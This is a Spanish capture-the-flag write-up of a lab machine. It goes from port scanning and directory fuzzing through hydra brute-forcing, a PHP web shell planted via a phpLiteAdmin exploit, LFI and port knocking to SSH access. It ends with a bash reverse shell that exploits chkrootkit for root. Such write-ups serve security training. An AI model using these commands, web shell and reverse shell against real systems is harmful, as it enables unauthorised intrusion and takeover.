
### Enumeración y escaneo

Hacemos un escaneo de puertos y vemos que el puerto 80 y 443 están abiertos, con lo que comprobaremos que hay en ellas.
```bash

sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.23.159

Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-23 17:45 +0200

Nmap scan report for 10.129.23.159

Host is up (0.067s latency).

Not shown: 65533 filtered tcp ports (no-response)

PORT STATE SERVICE

80/tcp open http

443/tcp open https

```

De primeras en el puerto 80 no hay nada a primera vista y en el 443 vemos una imagen simplemente.

![HTTP](/img/Pasted%20image%2020260423174644.png)

![HTTPS](/img/Pasted%20image%2020260423174757.png) 

Hacemos fuzzing con un diccionario simple y de momento no parece haber algo interesante.
```bash
gobuster dir --url http://10.129.23.159/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt
```
![](/img/Pasted%20image%2020260423175008.png) 

Supuse que podía haber rutas ocultas en el servidor web, al ampliar la enumeración con un diccionario más grande podemos descubrir un directorio que se llama department que sugería una funcionalidad interna.
```bash
gobuster dir --url http://10.129.23.159/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-tls-validation 

```

![](/img/Pasted%20image%2020260423182707.png)

  Al entrar vemos que es un simple login que posteriormente usaremos.

![](/img/Pasted%20image%2020260423182723.png)
#### Enumeración HTTPS 
Ahora procederemos a hacer fuzzing al puerto 443 y descubrimos el directorio /db
```bash 
gobuster dir --url https://10.129.23.159/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt --no-tls-validation
```

![](/img/Pasted%20image%2020260423175642.png) 

Al comprobarlo podemos ver que es un login del software phpLiteAdmin v1.9 
![](/img/Pasted%20image%2020260423175747.png) 

## Explotación
### HTTPS
Ya que es un simple login con solo el input de la contraseña le hacemos fuerza bruta

``` bash
hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.23.159  https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64 -V
``` 

![](/img/Pasted%20image%2020260423180737.png)

Usamos las credenciales y estaremos correctamente dentro del panel de control
![](/img/Pasted%20image%2020260423181116.png)

Investigamos el software y vemos que tiene varios exploits, procederé a usar el siguiente https://www.exploit-db.com/exploits/24044

![](/img/Pasted%20image%2020260423175849.png) 

Para el exploit debemos renombrar la base de datos, en mi caso la llamaré ninevehNotes.php

![](/img/Pasted%20image%2020260423190525.png)

Una vez creado debemos hacer una tabla nueva y añadirle la reverse shell

![](/img/Pasted%20image%2020260423181506.png)


Con una simple web shell de php como por ejemplo
 ```php
 <?php system($REQUEST["cmd"]); ?>
 ```

![](/img/Pasted%20image%2020260423190633.png)

Vemos que la base de datos está en el directorio /var/tmp en Rename Database lo cual nos hará falta para el ataque
![](/img/Pasted%20image%2020260423190525.png) 

### HTTP
Mediante una pequeña trampa podemos saber que el usuario que acepta te indica si es válido o no 
![](/img/Pasted%20image%2020260423182953.png) 


![](/img/Pasted%20image%2020260423183028.png) 


Así que haciendo fuerza bruta al login intentaremos averiguar la contraseña
```bash
hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.23.159  http-post-form
``` 
 
![](/img/Pasted%20image%2020260423183147.png) 

Una vez dentro con las credenciales sacadas buscaremos posibles vectores de ataque

![](/img/Pasted%20image%2020260423183250.png) 

Al darle al apartado Notes veremos que tenemos una vulnerabilidad de LFI la cuál explotaremos para escuchar el payload previamente creado en la base de datos

![](/img/Pasted%20image%2020260423183352.png) 


Ya que sabíamos previamente donde está la base de datos porque lo podíamos ver desde el phpLite procederemos poner dicho directorio.  Y ejecutamos el exploit y veremos que correctamente nos ha funcionado. Ahora haré los pasos conseguir una reverse shell en nuestro sistema.
  ![](/img/Pasted%20image%2020260423190738.png)

Pillamos la petición mediante burpsuite y cambiamos el método de esta a POST

![](/img/Pasted%20image%2020260423191114.png) 

Y lo cambiamos para tener iniciar la reverse shell con el payload puesto, enviamos y esperamos escuchando con nuestro programa. 

![](/img/Pasted%20image%2020260423191403.png) 

Habremos entrado al sistema exitosamente
 
![](/img/Pasted%20image%2020260423191513.png) 

Investigamos las carpetas y entramos a ssl 

![](/img/Pasted%20image%2020260423191742.png)

En secure_notes vemos un png en el cual hacemos el comando strings y nos muestra una private key de ssh del usuario amorois del propio sistema

![](/img/Pasted%20image%2020260423192016.png)

Sabemos que no tenía abierto ssh en el  escaneo previo así que investigo sus puertos abiertos y descubro que tiene un puerto 22 abierto

![](/img/Pasted%20image%2020260423192233.png) 

Como no tiene ssh veremos los programas que tiene desde /etc/init.d y comprobamos que está usando knockd que es un programa que sirve para ocultar puertos para mayor seguridad
![](/img/Pasted%20image%2020260423192747.png) 

En el propio fichero de configuración podemos comprobar que tiene bloqueado el puerto 22, así que debemos jugar con la secuencia dada para abrir el puerto.

![](/img/Pasted%20image%2020260423193024.png) 

Usaremos la herramienta knock y simplemente poniendo la secuencia podremos comprobar que se ha abierto el puerto 22 del ssh
![](/img/Pasted%20image%2020260423193434.png) 


Así que ahora simplemente con la clave privada previamente copiada la usaremos para iniciar sesión en ssh con el usuario amrois
 
![](/img/Pasted%20image%2020260423193647.png) 

Ya dentro podemos acceder a la primera flag de user.txt

![](/img/Pasted%20image%2020260423193958.png)
## Escalada de privilegios
Pasé el programa de pspy (https://github.com/dominicbreuker/pspy) para ver procesos que sean interesante y identifiqué que hay un proceso de chkrootkit el cuál tiene una vulnerabilidad explotable para escalar privilegios https://www.exploit-db.com/exploits/33899

![](Pasted%20image%2020260423200654.png)

Para ello debemos crear una reverseshell en /tmp que se llame update, este se ejecutara y seremos root exitosamente

```bash
bash -i >& /dev/tcp/10.10.14.180/443 0>&1
```

Esperamos y una vez ejecutado seremos root dará por concluido el laboratorio con la última flag de la máquina

![](/img/Pasted%20image%2020260423200905.png)